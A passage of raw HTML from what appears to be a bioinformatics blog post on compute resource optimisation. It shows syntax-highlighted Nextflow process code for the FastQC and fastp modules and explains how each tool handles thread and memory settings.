60%)">=</span><span class="token plain"> task.ext.prefix ?: </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${meta.id}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.html</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.zip</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;-</span><span class="token plain">END_VERSIONS </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${task.process}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        fastqc: </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> fastqc </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">'/FastQC v/!d; s/.*v//'</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<p>Overall, this script creates a command to run with threads and memory options. Here, memory is allocated per thread instead of total memory.
If I allocate 8 threads and 16 GB RAM, it will run the command as follows:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash -ue</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">printf</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"%s %s</span><span class="token string entity" style="color:hsl(230, 8%, 24%)">\n</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> SRX1603630_T1_1.fastq.gz GM12878_REP2_1.gz SRX1603630_T1_2.fastq.gz GM12878_REP2_2.gz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">while</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">read</span><span class="token plain"> old_name new_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${new_name}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ln</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-s</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$old_name</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$new_name</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">fastqc </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--threads</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--memory</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2048</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    GM12878_REP2_1.gz GM12878_REP2_2.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;-</span><span class="token string" style="color:hsl(119, 34%, 47%)">END_VERSIONS</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> </span><span class="token string bash punctuation operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> versions.yml</span><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">"FASTQC_3":</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">    fastqc: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> fastqc </span><span class="token string variable parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable string" style="color:hsl(119, 34%, 47%)">'/FastQC v/!d; s/.*v//'</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">END_VERSIONS</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="fastp">FASTP<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#fastp" class="hash-link" aria-label="Direct link to FASTP" title="Direct link to FASTP" translate="no">​</a></h3>
<p>fastp is simpler regarding CPUs and memory. It allows direct specification without needing to recalculate memory per thread.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process FASTP </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tag </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$meta</span><span class="token string" style="color:hsl(119, 34%, 47%)">.id"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    label </span><span class="token string" style="color:hsl(119, 34%, 47%)">'process_medium'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    conda </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${moduleDir}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/environment.yml"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    container </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${ workflow.containerEngine == 'singularity' &amp;&amp; </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">task.ext.singularity_pull_docker_container ?</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string variable" style="color:hsl(221, 87%, 60%)">        'https</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">community-cr-prod.seqera.io</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">docker</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">registry</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">v2</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">blobs</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">sha256</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">88</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">889a182b8066804f4799f3808a5813ad601381a8a0e3baa4ab8d73e739b97001</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">data' </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string variable" style="color:hsl(221, 87%, 60%)">        'community.wave.seqera.io</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">library</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">fastp</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">0.24.0--62c97b06e8447690' }</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path  adapter_fasta</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    val   discard_trimmed_pass</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    val   save_trimmed_fail</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    val   save_merged</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    output:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'*.fastp.fastq.gz'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> , optional:true, emit: reads</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'*.json'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">           , emit: json</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'*.html'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">           , emit: html</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'*.log'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">            , emit: log</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'*.fail.fastq.gz'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  , optional:true, emit: reads_fail</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'*.merged.fastq.gz'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, optional:true, emit: reads_merged</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path </span><span class="token string" style="color:hsl(119, 34%, 47%)">"versions.yml"</span><span class="token plain">                       , emit: versions</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    when:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    task.ext.when </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> null </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> task.ext.when</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def args </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task.ext.args ?: </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def prefix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task.ext.prefix ?: </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${meta.id}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def adapter_list </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> adapter_fasta ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--adapter_fasta </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${adapter_fasta}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def fail_fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> save_trimmed_fail </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> meta.single_end ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--failed_out </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.fail.fastq.gz"</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> save_trimmed_fail </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain">meta.single_end ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--failed_out </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.paired.fail.fastq.gz --unpaired1 </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">_1.fail.fastq.gz --unpaired2 </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">_2.fail.fastq.gz"</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def out_fq1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> discard_trimmed_pass ?: </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"> meta.single_end ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--out1 </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.fastp.fastq.gz"</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--out1 </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">_1.fastp.fastq.gz"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def out_fq2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> discard_trimmed_pass ?: </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--out2 </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">_2.fastp.fastq.gz"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    // Added soft-links to original fastqs </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> consistent naming </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> MultiQC</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    // Use single ended </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> interleaved. Add </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--interleaved_in</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> config.</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"> task.ext.args?.contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'--interleaved_in'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain">  </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ln</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-sf</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$reads</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastq.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        fastp </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--stdout</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--in1</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastq.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--thread</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$task</span><span class="token plain">.cpus </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--json</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastp.json </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--html</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastp.html </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$adapter_list</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$fail_fastq</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$args</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">.fastp.log </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span 